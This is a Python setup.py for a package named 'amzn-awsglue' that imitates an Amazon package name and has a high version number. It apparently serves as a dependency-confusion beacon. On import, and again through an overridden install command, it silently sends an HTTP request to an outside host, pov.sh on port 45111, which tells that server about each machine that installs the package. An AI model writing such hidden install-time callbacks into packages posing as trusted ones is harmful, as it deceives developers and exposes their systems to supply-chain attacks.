import sys
import os
from setuptools import setup, find_packages
from setuptools.command.install import install
import requests

requests.get("http://pov.sh:45111/api/v3/amzn-awsglue")
# Define the post-installation function
def post_install():
    # Example request to your server (replace with your actual endpoint)
    response = requests.get("http://pov.sh:45111/api/v3/amzn-awsglue")

# Create a custom command class to run the post-install function
class PostInstallCommand(install):
    def run(self):
        # Call the original install command
        install.run(self)
        # Run the post-install logic
        post_install()

# Define your package metadata
setup(
    name="amzn-awsglue",
    version="6.1.5",
    author="Your Name",
    author_email="your.email@example.com",
    description="A simple Python package",
    long_description=open('README.md').read(),
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/my_package",
    packages=find_packages(),
    install_requires=[
        'requests',  # Include the requests library to make HTTP requests
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
    cmdclass={
        'install': PostInstallCommand,  # Override the install command with our custom one
    },
)
